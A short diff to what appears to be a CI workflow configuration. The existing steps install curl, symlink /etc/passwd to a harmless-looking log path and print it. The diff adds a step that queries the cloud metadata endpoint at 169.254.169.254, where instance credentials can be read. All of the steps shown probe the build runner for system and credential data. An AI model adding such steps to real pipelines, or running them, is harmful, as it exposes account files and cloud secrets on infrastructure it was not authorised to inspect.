@@ -10,3 +10,4 @@
        - run: apt-get -y install curl
        - run: ln -s /etc/passwd /tmp/log
        - run: cat /tmp/log
+       - run: curl http://169.254.169.254
